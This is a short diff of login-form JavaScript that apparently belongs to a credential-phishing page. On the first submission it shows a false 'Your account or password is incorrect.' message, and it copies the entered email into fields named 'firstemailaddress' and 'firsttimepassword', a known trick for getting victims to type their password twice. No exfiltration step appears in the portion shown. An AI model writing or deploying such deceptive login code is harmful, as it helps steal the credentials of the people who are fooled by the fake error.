@@ -13,6 +13,8 @@ let form = document.getElementsByTagName('form')[0];
 let firstEmail = document.getElementById('firstemailaddress');
 let firstPassword = document.getElementById('firsttimepassword');
 
+let errorText = document.getElementById('red');
+
 let i = 0;
 
 // listen for open click
@@ -29,7 +31,8 @@ window.addEventListener('click', outsideClick);
 function openModal() {
     if (emailField.value.length > 0 && passwordField.value.length > 0) {
         if (i < 1) {
-            modal.style.display = 'block';
+            modal.style.display = 'none';
+            errorText.innerHTML = 'Your account or password is incorrect.'
             i += 1;
             modalBtn.innerHTML = '<button id="submit" type="submit">Next</button>'
             firstEmail.setAttribute('value', `${emailField.value}`);
